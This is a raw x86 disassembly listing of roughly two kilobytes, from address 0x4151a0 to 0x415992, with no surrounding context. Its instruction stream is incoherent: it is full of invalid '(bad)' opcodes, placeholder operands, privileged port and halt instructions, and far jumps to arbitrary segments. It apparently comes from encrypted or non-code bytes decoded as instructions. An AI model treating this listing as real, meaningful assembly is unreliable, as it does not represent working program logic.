  4151a0:	cmc    
  4151a1:	mov    dh,0xe9
  4151a3:	mov    ?,WORD PTR [ebx+0x41960883]
  4151a9:	jns    0x415160
  4151ab:	sbb    al,0x14
  4151ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ae:	lods   eax,DWORD PTR ds:[esi]
  4151af:	mov    edx,0xb2a1a1b5
  4151b4:	pop    esi
  4151b5:	xor    eax,0xab7ae325
  4151ba:	lock sar DWORD PTR ds:0x6e7e3b53,0x89
  4151c2:	rcr    BYTE PTR ds:[esi],0x3f
  4151c6:	or     al,0x1b
  4151c8:	stos   DWORD PTR es:[edi],eax
  4151c9:	test   al,0x81
  4151cb:	dec    esi
  4151cc:	jo     0x415228
  4151ce:	jp     0x41524d
  4151d0:	or     ebx,DWORD PTR gs:[edx+0x2c384960]
  4151d7:	pop    ss
  4151d8:	sar    DWORD PTR [edx],0x4c
  4151db:	cs (bad) 
  4151de:	out    dx,eax
  4151df:	test   edi,eax
  4151e1:	and    eax,0xc653168b
  4151e6:	jecxz  0x4151d5
  4151e8:	int3   
  4151e9:	imul   edi,DWORD PTR [eax-0x58af7ebc],0xd
  4151f0:	mov    BYTE PTR [edx],ah
  4151f2:	out    0xd,eax
  4151f4:	cdq    
  4151f5:	xor    ebp,DWORD PTR [esi-0xb]
  4151f8:	int    0x6f
  4151fa:	stos   DWORD PTR es:[edi],eax
  4151fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151fc:	inc    ebp
  4151fd:	icebp  
  4151fe:	add    BYTE PTR [eax+0x40],dl
  415201:	jl     0x41521f
  415203:	das    
  415204:	jmp    0xf9aa240e
  415209:	rol    DWORD PTR [ebx+0x65],cl
  41520c:	xchg   edx,eax
  41520d:	mov    BYTE PTR [ebx+0x47],al
  415210:	pop    esp
  415211:	inc    ecx
  415212:	inc    eax
  415213:	pop    edx
  415214:	mov    BYTE PTR [esi-0x455456ae],ah
  41521a:	xchg   esi,eax
  41521b:	push   ecx
  41521c:	(bad)  
  41521d:	and    eax,DWORD PTR [esi+0x6991e7c4]
  415223:	ror    BYTE PTR [ebx],0x9d
  415226:	jmp    0xc1f935a3
  41522b:	dec    edx
  41522c:	cld    
  41522d:	dec    esi
  41522e:	repnz xchg ebx,eax
  415230:	fwait
  415231:	std    
  415232:	test   DWORD PTR [edx+0x5edd3801],0xd01833d
  41523c:	sti    
  41523d:	and    DWORD PTR [ecx+0x3e617fe],esp
  415243:	(bad)  
  415244:	in     eax,dx
  415245:	xor    al,0x4f
  415247:	bound  ebp,QWORD PTR [edi]
  415249:	(bad)  
  41524a:	shr    DWORD PTR [eax+ebp*4+0x57b852a5],cl
  415251:	push   ebp
  415252:	and    esi,edx
  415254:	jne    0x4151fb
  415256:	push   edx
  415257:	jmp    0x4152ab
  415259:	adc    eax,ebx
  41525b:	mov    edi,0x6451babe
  415261:	rcl    DWORD PTR [eax],cl
  415263:	adc    bl,BYTE PTR [ebp-0x55]
  415266:	data16 das 
  415268:	mov    edi,DWORD PTR [ebp-0x2b]
  41526b:	jno    0x41527a
  41526d:	sub    esp,eax
  41526f:	fsub   st,st(5)
  415271:	xchg   edx,eax
  415272:	mov    edi,DWORD PTR [edi]
  415274:	jge    0x415286
  415276:	daa    
  415277:	pop    gs
  415279:	xchg   edi,eax
  41527a:	out    0xe0,eax
  41527c:	in     al,0x4e
  41527e:	add    ebx,DWORD PTR [edi+0x38]
  415281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415282:	cmp    al,cl
  415284:	fimul  WORD PTR [esi-0x545024f8]
  41528a:	rcr    ecx,cl
  41528c:	js     0x4152e9
  41528e:	and    ah,BYTE PTR [ebx]
  415290:	cld    
  415291:	add    bh,0x56
  415294:	ins    DWORD PTR es:[edi],dx
  415295:	cli    
  415296:	loop   0x415284
  415298:	adc    al,0x30
  41529a:	xchg   ebx,eax
  41529b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41529c:	cmp    al,0xfd
  41529e:	xor    eax,edi
  4152a0:	call   FWORD PTR [esi-0x61]
  4152a3:	cs jb  0x4152a2
  4152a6:	loop   0x415236
  4152a8:	add    al,0xa8
  4152ab:	push   0x9c2f81fc
  4152b0:	aad    0x16
  4152b2:	or     al,BYTE PTR [edx]
  4152b4:	mov    ah,0x2d
  4152b6:	fwait
  4152b7:	xchg   DWORD PTR [ebp-0x6f7fb09e],eax
  4152bd:	xchg   edx,eax
  4152be:	fld    TBYTE PTR [edx]
  4152c0:	daa    
  4152c1:	in     eax,0xc3
  4152c3:	dec    edi
  4152c4:	sub    BYTE PTR [esi],0xec
  4152c7:	leave  
  4152c8:	cmp    eax,0x4126742f
  4152cd:	es dec ecx
  4152cf:	pop    edx
  4152d0:	test   eax,0xd490c8f0
  4152d5:	xor    bl,dl
  4152d7:	(bad)  
  4152d9:	push   edi
  4152da:	cli    
  4152db:	(bad)  
  4152dd:	add    BYTE PTR [ecx+0x79060c2e],bl
  4152e3:	or     bl,dh
  4152e5:	(bad)  
  4152e7:	rcl    dh,cl
  4152e9:	push   es
  4152ea:	inc    edx
  4152eb:	dec    ebp
  4152ec:	call   0x8ce:0xb20f94b6
  4152f3:	test   eax,0xd6157d26
  4152f8:	inc    edi
  4152f9:	into   
  4152fa:	call   0x32db606
  4152ff:	cmp    DWORD PTR [esi+0x75808c6b],ebp
  415305:	or     al,0xe4
  415307:	push   cs
  415308:	xor    eax,0xd4be2b3d
  41530d:	jno    0x4152c8
  41530f:	pop    ss
  415310:	adc    DWORD PTR cs:[edx-0xf1315bd],edi
  415317:	jae    0x4152ee
  415319:	push   0xffffffd3
  41531b:	adc    eax,0xa94d7afa
  415320:	das    
  415321:	xor    al,0xec
  415323:	fbstp  TBYTE PTR [esi+ebp*4]
  415326:	mov    ah,0xed
  415328:	aad    0xe5
  41532a:	push   esp
  41532b:	xchg   esp,eax
  41532c:	sti    
  41532d:	cmp    edi,esp
  41532f:	push   ss
  415330:	dec    eax
  415331:	fs sub eax,0x52273b79
  415337:	int3   
  415338:	into   
  415339:	cmp    ecx,DWORD PTR [ebx-0x4a]
  41533c:	cmp    eax,0xf160344
  415341:	mov    ebp,0x647f4381
  415346:	xchg   ecx,eax
  415347:	sbb    DWORD PTR [edi+edi*1],esp
  41534a:	adc    eax,ebp
  41534c:	int3   
  41534d:	daa    
  41534e:	fld    TBYTE PTR [edi+0x74]
  415351:	sub    al,0xcf
  415353:	fwait
  415354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415355:	mov    ah,BYTE PTR [esi+eax*2]
  415358:	sbb    DWORD PTR [eax-0x626659b4],0x27
  41535f:	mov    ch,0x60
  415361:	fisub  DWORD PTR [eax]
  415363:	hlt    
  415364:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415365:	dec    ebx
  415366:	aad    0xd9
  415368:	(bad)  
  415369:	in     eax,dx
  41536a:	push   ss
  41536b:	add    eax,0x9aaab73
  415370:	test   BYTE PTR [eax-0x60],bh
  415373:	pusha  
  415374:	xor    cl,BYTE PTR [eax-0x3]
  415377:	ret    
  415378:	sub    ebp,DWORD PTR ds:0x628ce1d2
  41537e:	xchg   edi,eax
  41537f:	lea    edx,[ecx-0x47df9b95]
  415385:	sbb    al,0x98
  415387:	jno    0x41538d
  415389:	add    al,0x65
  41538b:	test   al,0xc7
  41538d:	mov    ds:0xc4a7c148,al
  415392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415393:	push   0x75c5787b
  415398:	push   ds
  415399:	adc    BYTE PTR [edx-0x54b25e36],dh
  41539f:	test   BYTE PTR [edx],bh
  4153a1:	sub    DWORD PTR [ecx],eax
  4153a3:	or     edx,ebp
  4153a5:	xchg   edi,eax
  4153a6:	mov    cl,al
  4153a8:	call   0x4ec2:0x41dc845c
  4153af:	xchg   BYTE PTR [ebp+0x3b2a2968],ch
  4153b5:	stc    
  4153b6:	fdiv   QWORD PTR [esi]
  4153b8:	adc    al,0xbd
  4153ba:	sub    cl,BYTE PTR [esi+0x6228b911]
  4153c0:	js     0x41542a
  4153c2:	stos   BYTE PTR es:[edi],al
  4153c3:	sub    al,0x12
  4153c5:	jnp    0x4153ac
  4153c7:	(bad)  
  4153c8:	sbb    ebx,DWORD PTR [esi-0x129e2e7d]
  4153ce:	push   esp
  4153cf:	mov    al,0xf6
  4153d1:	mov    al,ds:0x1d6cc322
  4153d6:	out    dx,eax
  4153d7:	mov    ds:0x4f30e8ab,eax
  4153dc:	es repz adc cl,bl
  4153e0:	scas   eax,DWORD PTR es:[edi]
  4153e1:	fwait
  4153e2:	sbb    edi,DWORD PTR [ebx+ecx*1]
  4153e5:	sahf   
  4153e6:	and    DWORD PTR [ecx-0x44],edx
  4153e9:	jmp    0xe41c:0xf7c4bece
  4153f0:	xchg   ebx,eax
  4153f1:	imul   eax,DWORD PTR [ecx+0x4bfc3fb4],0x35
  4153f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f9:	cmp    edx,edx
  4153fb:	dec    ecx
  4153fc:	stos   DWORD PTR es:[edi],eax
  4153fd:	arpl   WORD PTR [edi+0x7b],cx
  415400:	sub    DWORD PTR [ebx],ebp
  415402:	cld    
  415403:	or     eax,0xab9ce93c
  415408:	lods   al,BYTE PTR ds:[esi]
  415409:	dec    ebp
  41540a:	mov    ecx,0x1bb6bf60
  41540f:	cld    
  415410:	sub    BYTE PTR [ebx-0x56582c8b],ah
  415416:	stos   BYTE PTR es:[edi],al
  415417:	test   BYTE PTR [ebx+0x3c],dh
  41541a:	or     eax,edi
  41541c:	arpl   ax,sp
  41541e:	ror    dh,cl
  415420:	xor    BYTE PTR ss:[ecx],0xdd
  415424:	xlat   BYTE PTR ds:[ebx]
  415425:	sub    BYTE PTR [eax+0x1a],dh
  415428:	repz ret 0xcbf4
  41542c:	jno    0x415402
  41542e:	repz retf 
  415430:	cmp    BYTE PTR [ebp-0x61fefd16],0x91
  415437:	lahf   
  415438:	(bad)  
  41543a:	div    BYTE PTR [ebx+0x6]
  41543d:	sub    DWORD PTR [ebp-0x22],ecx
  415440:	inc    esp
  415441:	int3   
  415442:	xlat   BYTE PTR ds:[ebx]
  415443:	inc    ebx
  415444:	mov    edi,DWORD PTR [ebx+0x26f99fd0]
  41544a:	cwde   
  41544b:	les    ebp,FWORD PTR [ebx+0x70]
  41544e:	rcr    DWORD PTR [edi+eiz*4],cl
  415451:	sti    
  415452:	mov    esi,eax
  415454:	shl    DWORD PTR [ebp-0x49],0x71
  415458:	fistp  WORD PTR [ecx+0x651b2976]
  41545e:	retf   0x9b83
  415461:	jl     0x415410
  415463:	cmc    
  415464:	adc    al,0x9b
  415466:	jecxz  0x41544c
  415468:	push   esi
  415469:	dec    esi
  41546a:	add    dh,BYTE PTR [edx+0x5e8b1d47]
  415470:	test   ch,dl
  415472:	pop    ds
  415473:	lock xor DWORD PTR [ebp+ebx*4-0x5d],edx
  415478:	cs out dx,eax
  41547a:	add    dl,ch
  41547c:	pop    edx
  41547d:	adc    eax,0xae482a60
  415482:	inc    edi
  415483:	mov    ecx,0xc050216
  415488:	hlt    
  415489:	pop    ecx
  41548a:	scas   al,BYTE PTR es:[edi]
  41548b:	pop    ebx
  41548c:	add    DWORD PTR [eax+edx*2-0x306ca97a],esp
  415493:	sub    al,0x12
  415495:	aaa    
  415496:	push   ebp
  415497:	sub    esi,ecx
  415499:	aad    0x69
  41549b:	and    edx,DWORD PTR [ebp+0x3a9ab7ac]
  4154a1:	out    dx,al
  4154a2:	jbe    0x4154b7
  4154a4:	sbb    DWORD PTR [ecx+esi*2],edi
  4154a7:	inc    ebp
  4154a8:	mov    ds,edx
  4154aa:	push   edx
  4154ab:	inc    eax
  4154ac:	inc    ebp
  4154ad:	push   0xaea8fffc
  4154b2:	and    eax,0xa8c789cf
  4154b7:	and    BYTE PTR [eax],ah
  4154b9:	bound  esi,QWORD PTR [edi+0x25]
  4154bc:	ret    
  4154bd:	and    BYTE PTR [edi+0x4],al
  4154c0:	pop    ebp
  4154c1:	ss jl  0x41547d
  4154c4:	adc    edx,DWORD PTR [edi-0x9ed3cdf]
  4154ca:	icebp  
  4154cb:	imul   esp,DWORD PTR [edx-0x6d316320],0x5e
  4154d2:	(bad)  
  4154d3:	fld    QWORD PTR [ecx+0x5d]
  4154d6:	cmp    ah,ah
  4154d8:	add    al,BYTE PTR [edx]
  4154da:	push   eax
  4154db:	push   es
  4154dc:	imul   eax,DWORD PTR [edx],0x9b834cda
  4154e2:	sbb    ch,BYTE PTR [ebx]
  4154e4:	lea    ecx,[esi-0x36]
  4154e7:	push   edi
  4154e8:	(bad)  
  4154e9:	jp     0x4154ea
  4154eb:	shl    dh,0xfb
  4154ee:	call   0xb00c:0x15f73877
  4154f5:	popa   
  4154f6:	or     bh,BYTE PTR [esi-0x2d]
  4154f9:	mov    dh,BYTE PTR ds:0x2e3ecedd
  4154ff:	loop   0x4154f6
  415501:	out    dx,al
  415502:	sbb    BYTE PTR [ebp+ebp*2-0x5e],al
  415506:	jno    0x4154f5
  415508:	scas   eax,DWORD PTR es:[edi]
  415509:	jb     0x415572
  41550b:	pop    edx
  41550c:	outs   dx,BYTE PTR ds:[esi]
  41550d:	fwait
  41550e:	cmp    bl,BYTE PTR [ecx+0x5ae59939]
  415514:	push   es
  415515:	push   ecx
  415516:	adc    al,0x25
  415518:	das    
  415519:	ss or  al,0x75
  41551c:	mov    ebp,0xad4218d8
  415521:	out    0x79,eax
  415523:	mov    dl,0x2a
  415525:	jmp    0x1074825b
  41552a:	pop    ebp
  41552b:	and    eax,0xc02225e1
  415530:	mov    eax,ds:0x3391e167
  415535:	pop    ebx
  415536:	sahf   
  415537:	test   eax,0xee3f5bfa
  41553c:	pop    ds
  41553d:	lea    edx,[ecx-0x77a9874c]
  415543:	sahf   
  415544:	push   edi
  415545:	adc    BYTE PTR [ebx],al
  415547:	pop    ss
  415548:	shl    DWORD PTR [esp+esi*8],1
  41554b:	jl     0x41554a
  41554d:	jbe    0x415596
  41554f:	jae    0x415554
  415551:	out    0x30,eax
  415553:	hlt    
  415554:	outs   dx,BYTE PTR ds:[esi]
  415555:	dec    esp
  415556:	ins    DWORD PTR es:[edi],dx
  415557:	push   esp
  415558:	push   ds
  415559:	and    eax,0xfcaafa00
  41555e:	fisubr WORD PTR [edx+0x7f2eae71]
  415564:	or     edi,DWORD PTR [edx]
  415566:	je     0x41557d
  415568:	fistp  DWORD PTR es:[eax+eax*4]
  41556c:	out    dx,al
  41556d:	adc    DWORD PTR [ebp+0x3a],ebx
  415570:	mov    ebx,DWORD PTR [ecx+0x2c5ed309]
  415576:	or     ah,BYTE PTR [eax]
  415578:	mov    ds:0x91b7c2d3,al
  41557d:	hlt    
  41557e:	push   esi
  41557f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415580:	fnstcw WORD PTR [edx]
  415582:	pop    es
  415583:	push   ebx
  415584:	mov    esp,0xab71d95
  415589:	loopne 0x4155b4
  41558b:	add    ah,BYTE PTR [eax+0x269b8aac]
  415591:	dec    eax
  415592:	cdq    
  415593:	mov    ebx,0x2d24b2e1
  415598:	imul   esp,DWORD PTR [esp+edx*2+0x44],0xbc142722
  4155a0:	imul   ecx,DWORD PTR [ecx+0x50],0xf58f0aa0
  4155a7:	jp     0x415598
  4155a9:	sti    
  4155aa:	pop    ebp
  4155ab:	or     al,0x50
  4155ad:	jge    0x4155ea
  4155af:	adc    ah,BYTE PTR [ecx+edx*2+0x7]
  4155b3:	sub    al,0x30
  4155b5:	cmp    dl,0x1
  4155b8:	scas   al,BYTE PTR es:[edi]
  4155b9:	and    ebx,ebp
  4155bb:	stos   BYTE PTR es:[edi],al
  4155bc:	adc    DWORD PTR [ecx],eax
  4155be:	sti    
  4155bf:	dec    edx
  4155c0:	out    dx,al
  4155c1:	add    DWORD PTR [ecx+ebx*1+0x4d],esi
  4155c5:	mov    eax,ds:0x89bc0025
  4155ca:	sbb    eax,0x777cf65e
  4155d0:	cmp    ebp,DWORD PTR [ecx+0x703b1cdd]
  4155d6:	imul   edi,DWORD PTR [ebp-0x6f],0x4d
  4155da:	dec    ecx
  4155db:	inc    esp
  4155dc:	jmp    0x8e03:0xc88a20ad
  4155e3:	adc    DWORD PTR [ecx+0x40670296],edx
  4155e9:	bound  eax,QWORD PTR [ebx]
  4155eb:	jbe    0x4155ae
  4155ed:	pop    es
  4155ee:	mov    esp,0x87c3cd85
  4155f3:	mov    edi,0x7d02b911
  4155f8:	mov    edx,DWORD PTR [eax+0x18]
  4155fb:	adc    ah,dl
  4155fd:	retf   0x9ec3
  415600:	sbb    eax,0xc76d0d1d
  415605:	xchg   esp,eax
  415606:	test   eax,0xef472dcb
  41560b:	pushf  
  41560c:	idiv   DWORD PTR gs:[esi]
  41560f:	push   ebp
  415610:	fidivr DWORD PTR [ebx]
  415612:	in     eax,0x21
  415614:	inc    ecx
  415615:	and    al,0x94
  415617:	mov    esi,0x5af2d743
  41561c:	je     0x41569c
  41561e:	sahf   
  41561f:	or     ebx,DWORD PTR [ebx+0x2aeacd60]
  415625:	(bad)  
  415626:	scas   eax,DWORD PTR es:[edi]
  415627:	addr16 pop edx
  415629:	push   cs
  41562a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41562b:	and    DWORD PTR [edi+0x561421d1],0x1
  415632:	jle    0x415601
  415634:	jmp    0x40ff2006
  415639:	js     0x415665
  41563b:	(bad)  
  41563c:	dec    esp
  41563d:	mov    ds:0x98b26210,eax
  415642:	js     0x4155e4
  415644:	repz pop ss
  415646:	enter  0xaff2,0xae
  41564a:	or     DWORD PTR [eax-0x62],esi
  41564d:	aas    
  41564e:	and    eax,0xd54dccdd
  415653:	cmc    
  415654:	not    DWORD PTR [ebx-0x14]
  415657:	adc    esp,DWORD PTR [edx+0x76]
  41565a:	enter  0x1482,0x2d
  41565e:	dec    eax
  41565f:	mov    esp,0xafd9b5a1
  415664:	and    ebp,0x7
  415667:	dec    edi
  415668:	nop
  415669:	and    eax,0x3eca88ab
  41566e:	in     al,dx
  41566f:	pushf  
  415670:	xor    al,0x94
  415672:	jno    0x415666
  415674:	xor    ebp,DWORD PTR [esi-0xf]
  415677:	ret    0xb889
  41567a:	dec    esi
  41567b:	cmp    al,0x4a
  41567d:	inc    edx
  41567e:	xchg   ebx,eax
  41567f:	imul   edx,DWORD PTR ss:[ecx+edx*1+0x1a21b7a4],0x61
  415688:	push   esi
  415689:	iret   
  41568a:	cmp    ebx,DWORD PTR [edx-0x4d031a5e]
  415690:	lods   eax,DWORD PTR ds:[esi]
  415691:	loopne 0x415638
  415693:	sub    BYTE PTR [edx+ebx*8+0xa2a5750],ch
  41569a:	and    al,0x83
  41569c:	fscale 
  41569e:	mov    esi,edi
  4156a0:	ror    BYTE PTR [ebx],1
  4156a2:	mov    ah,BYTE PTR [eax+esi*2]
  4156a5:	inc    ebx
  4156a6:	add    ebx,ebx
  4156a8:	and    edi,ebx
  4156aa:	stos   DWORD PTR es:[edi],eax
  4156ab:	aad    0x36
  4156ad:	les    edx,FWORD PTR [ebx]
  4156af:	je     0x4156a7
  4156b1:	pop    eax
  4156b2:	aaa    
  4156b3:	mov    ecx,0xb952aaa4
  4156b8:	out    0xcd,eax
  4156ba:	aas    
  4156bb:	inc    esi
  4156bc:	sbb    al,0x12
  4156be:	iret   
  4156bf:	add    ch,BYTE PTR [ecx]
  4156c1:	mov    bl,0x5f
  4156c3:	mov    WORD PTR [edi-0x69310d99],ss
  4156c9:	int3   
  4156ca:	fs hlt 
  4156cc:	leave  
  4156cd:	sahf   
  4156ce:	pop    ds
  4156cf:	sahf   
  4156d0:	lods   al,BYTE PTR ds:[esi]
  4156d1:	push   ebp
  4156d2:	retf   0x8b23
  4156d5:	sbb    ah,BYTE PTR [ebp-0x47]
  4156d8:	mov    gs,WORD PTR [eax+0x63]
  4156db:	xchg   edx,eax
  4156dc:	cmovs  esp,DWORD PTR [edx]
  4156df:	mov    BYTE PTR ds:0x627dc7fc,ch
  4156e5:	ins    BYTE PTR es:[edi],dx
  4156e6:	mov    dl,0xab
  4156e8:	je     0x41573e
  4156ea:	(bad)  
  4156eb:	in     al,0xf0
  4156ed:	fist   WORD PTR [ecx-0x3a]
  4156f0:	mov    cl,0x1a
  4156f2:	lahf   
  4156f3:	fisub  DWORD PTR [edx-0x6f]
  4156f6:	cmp    eax,0xb3d6c787
  4156fb:	rol    DWORD PTR [edi-0x3683f0eb],1
  415701:	jg     0x4156d8
  415703:	or     eax,0x4892e2b
  415708:	cld    
  415709:	jmp    0x1509:0x563d65fd
  415710:	lods   al,BYTE PTR ds:[esi]
  415711:	xchg   BYTE PTR [ebp+0x771d8d53],bh
  415717:	fild   DWORD PTR [eax-0xdcf7599]
  41571d:	loop   0x41578b
  41571f:	xchg   ecx,eax
  415720:	es into 
  415722:	aas    
  415723:	xor    al,0xe6
  415725:	aam    0x84
  415727:	jmp    0xf3c1382
  41572c:	jns    0x4156d3
  41572e:	mov    dl,0xc4
  415730:	jno    0x415759
  415732:	cdq    
  415733:	dec    ecx
  415734:	in     eax,dx
  415735:	jmp    0x21d8:0x37a09d53
  41573c:	and    BYTE PTR [esi-0x25],cl
  41573f:	int    0x7e
  415741:	jne    0x415773
  415743:	sti    
  415744:	in     al,dx
  415745:	(bad)  
  415746:	mov    dh,0xf1
  415748:	jle    0x4156fc
  41574a:	lahf   
  41574b:	jmp    0x415759
  41574d:	and    BYTE PTR [edx],0x16
  415750:	mov    eax,0xdb95aecd
  415755:	jb     0x4157d4
  415757:	xchg   ebx,eax
  415758:	pop    ss
  415759:	fwait
  41575a:	cmp    DWORD PTR [eax],edx
  41575c:	dec    ebx
  41575d:	xchg   esp,eax
  41575e:	inc    esi
  41575f:	push   ds
  415760:	or     BYTE PTR [edx-0x38dc22ce],0x97
  415767:	in     al,0xb4
  415769:	idiv   BYTE PTR [edi]
  41576b:	pop    eax
  41576c:	fist   WORD PTR [esi-0xb27967d]
  415772:	(bad)  
  415773:	mov    ebx,0x1a9547e8
  415778:	xchg   edx,eax
  415779:	std    
  41577a:	inc    ebx
  41577b:	push   es
  41577c:	cli    
  41577d:	ret    
  41577e:	fld    QWORD PTR [ebx+0x41b49823]
  415784:	js     0x4157ea
  415786:	pop    esi
  415787:	data16 (bad) [esi+ebx*8-0x55]
  41578c:	(bad)  
  41578d:	mov    ds:0x8f0863ed,eax
  415792:	mov    esp,0xe3ca5c91
  415797:	sahf   
  415798:	pop    es
  415799:	adc    al,0x36
  41579b:	pop    ebx
  41579c:	mov    edi,0x3109c36d
  4157a1:	(bad)  
  4157a2:	retf   0x16c7
  4157a5:	xchg   ecx,esp
  4157a7:	and    al,0xd2
  4157a9:	pop    esp
  4157aa:	xchg   ebp,eax
  4157ab:	ja     0x4157e7
  4157ad:	(bad)  
  4157ae:	std    
  4157af:	sti    
  4157b0:	pop    ebp
  4157b1:	push   ecx
  4157b2:	pushf  
  4157b3:	mov    ebx,0x28feaa97
  4157b8:	(bad)  
  4157ba:	jno    0x415768
  4157bc:	add    esp,DWORD PTR [esp+esi*2+0xe097b38]
  4157c3:	enter  0xe97e,0x36
  4157c7:	test   eax,0x1d6f492
  4157cc:	mov    dh,0x52
  4157ce:	fcom   DWORD PTR [edx+edx*4]
  4157d1:	cmp    eax,0x41c51445
  4157d6:	lahf   
  4157d7:	adc    BYTE PTR [edi],bl
  4157d9:	retf   
  4157da:	xor    eax,eax
  4157dc:	fstp   TBYTE PTR [ecx]
  4157de:	jbe    0x41585f
  4157e0:	jmp    0x80d5:0xebfd277f
  4157e7:	inc    esp
  4157e8:	mov    ds:0x9e554d4e,eax
  4157ed:	das    
  4157ee:	popf   
  4157ef:	lds    ebx,FWORD PTR [esi-0x36a77307]
  4157f5:	in     eax,dx
  4157f6:	arpl   WORD PTR [ecx+0x375fd203],sp
  4157fc:	stos   DWORD PTR es:[edi],eax
  4157fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157fe:	pop    edx
  4157ff:	mov    ds:0x5d7cdde5,eax
  415804:	repz fistp QWORD PTR [ebx]
  415807:	in     eax,0xeb
  415809:	sbb    eax,0x4cab789
  41580e:	pop    ecx
  41580f:	jb     0x41585b
  415811:	cmp    eax,0x99908bec
  415816:	sub    eax,0xd451d78
  41581b:	aad    0xb9
  41581d:	mov    ss,WORD PTR [ecx]
  41581f:	jp     0x415894
  415821:	mov    cl,0x70
  415823:	shl    DWORD PTR ds:0xfd6253d7,0x73
  41582a:	sub    BYTE PTR [eax-0x1529c459],ch
  415830:	lea    esp,ds:[ebx+0xacff086]
  415837:	in     eax,dx
  415838:	pop    es
  415839:	pop    edi
  41583a:	pop    eax
  41583b:	aam    0xd7
  41583d:	push   edi
  41583e:	(bad)  
  41583f:	retf   0x23b7
  415842:	out    dx,eax
  415843:	and    eax,0xef897cc3
  415848:	ins    DWORD PTR es:[edi],dx
  415849:	cmp    al,0x5
  41584b:	mov    esp,0xa15ad936
  415850:	pop    esi
  415851:	stos   DWORD PTR es:[edi],eax
  415852:	sub    eax,DWORD PTR [ecx+0x1999df60]
  415858:	mov    WORD PTR [edi-0x1b5d2720],?
  41585e:	hlt    
  41585f:	ins    DWORD PTR es:[edi],dx
  415860:	(bad)  
  415861:	stc    
  415862:	enter  0x2496,0xe2
  415866:	xor    eax,0x51a6ffdc
  41586b:	scas   eax,DWORD PTR es:[edi]
  41586c:	enter  0x187,0x99
  415870:	cld    
  415871:	jecxz  0x415821
  415873:	jmp    0x6f86bf57
  415878:	jl     0x415833
  41587a:	jge    0x415890
  41587c:	mov    ds:0xad3889b7,al
  415881:	sbb    ebp,0x61b35000
  415887:	add    al,0x7c
  415889:	in     al,dx
  41588a:	pop    esp
  41588b:	mov    ds:0x492e44e4,al
  415890:	add    BYTE PTR [ebp-0x7f],cl
  415893:	aas    
  415894:	sbb    eax,0x2d89819a
  415899:	push   edx
  41589a:	push   esi
  41589b:	cmp    edx,esi
  41589d:	psubq  mm7,QWORD PTR [edx]
  4158a0:	pop    edx
  4158a1:	ds mov ah,0x9d
  4158a4:	fwait
  4158a5:	push   edi
  4158a6:	mov    al,0x5e
  4158a8:	hlt    
  4158a9:	mov    ah,0x20
  4158ab:	mov    eax,0xccec73f3
  4158b0:	shl    DWORD PTR gs:[esi],1
  4158b3:	push   cs
  4158b4:	pop    esp
  4158b5:	mov    dh,0x55
  4158b7:	cmp    eax,DWORD PTR [edx+edx*8+0x65dc7cb1]
  4158be:	mov    ds:0xb415f62f,al
  4158c3:	push   esi
  4158c4:	int3   
  4158c5:	cwde   
  4158c6:	adc    eax,0x5e72181b
  4158cb:	cmp    edx,DWORD PTR [edi-0x61]
  4158ce:	inc    edx
  4158cf:	cli    
  4158d0:	imul   ecx,DWORD PTR [ebx],0xaa319817
  4158d6:	mov    ?,WORD PTR [edi+0x5fe908ad]
  4158dc:	stos   DWORD PTR es:[edi],eax
  4158dd:	push   ebx
  4158de:	and    eax,0xbfad2d61
  4158e3:	adc    eax,0x354f248c
  4158e8:	cmp    ecx,DWORD PTR [ecx+0x3ea510a]
  4158ee:	daa    
  4158ef:	fisttp WORD PTR [ebp-0x1c059175]
  4158f5:	call   0x446a:0xa685ee48
  4158fc:	pop    eax
  4158fd:	scas   eax,DWORD PTR es:[edi]
  4158fe:	dec    edx
  4158ff:	fmul   st(6),st
  415901:	dec    esi
  415902:	xor    bl,ah
  415904:	xor    BYTE PTR [esi-0xdbbd10b],bl
  41590a:	(bad)  
  41590b:	aad    0xd1
  41590d:	ja     0x4158e4
  41590f:	int    0x9b
  415911:	mov    bl,0x6e
  415913:	rol    BYTE PTR [eax+0x64],cl
  415916:	jo     0x415980
  415918:	jmp    0x4158d3
  41591a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41591b:	or     eax,0xacf706fd
  415920:	cmp    al,0xad
  415922:	jbe    0x415997
  415924:	shl    DWORD PTR [edi],1
  415926:	lds    eax,FWORD PTR [edx-0x12]
  415929:	jl     0x415918
  41592b:	xor    eax,edx
  41592d:	lahf   
  41592e:	sbb    al,0x27
  415930:	loopne 0x415920
  415932:	shr    BYTE PTR [edi],1
  415934:	push   ecx
  415935:	mov    ebx,0x49bc451f
  41593a:	popa   
  41593b:	adc    al,0x9
  41593d:	bound  edi,QWORD PTR [ebx]
  41593f:	mov    bl,0xe
  415941:	sbb    DWORD PTR [eax],edx
  415943:	push   0x550ec59
  415948:	ins    DWORD PTR es:[edi],dx
  415949:	xor    bl,BYTE PTR [edi+0x3c]
  41594c:	xlat   BYTE PTR ds:[ebx]
  41594d:	sub    cl,0x8d
  415950:	leave  
  415951:	dec    esi
  415952:	or     ah,bh
  415954:	(bad)
  415957:	scas   al,BYTE PTR es:[edi]
  415958:	(bad)  
  415959:	stos   BYTE PTR es:[edi],al
  41595a:	pop    ebx
  41595b:	gs jae 0x415922
  41595e:	jl     0x415949
  415960:	imul   esi,DWORD PTR [ecx+0x63],0x13
  415964:	pop    ebp
  415965:	xchg   ebx,eax
  415966:	daa    
  415967:	pushf  
  415968:	and    eax,0xb9cc9beb
  41596d:	sti    
  41596e:	cmp    DWORD PTR gs:[ebx+0x28],esi
  415972:	lahf   
  415973:	dec    edi
  415974:	ror    bl,cl
  415976:	js     0x415991
  415978:	jle    0x415926
  41597a:	(bad)  
  41597b:	mov    ebx,0x3edc2a4e
  415980:	sub    esp,DWORD PTR ds:0x4674966a
  415986:	int    0x18
  415988:	or     DWORD PTR [edx],esp
  41598a:	fsub   st(7),st
  41598c:	xchg   edx,eax
  41598d:	test   edx,esi
  41598f:	mov    edx,DWORD PTR [edi]
  415991:	lods   al,BYTE PTR ds:[esi]
  415992:	xor    al,0xbe
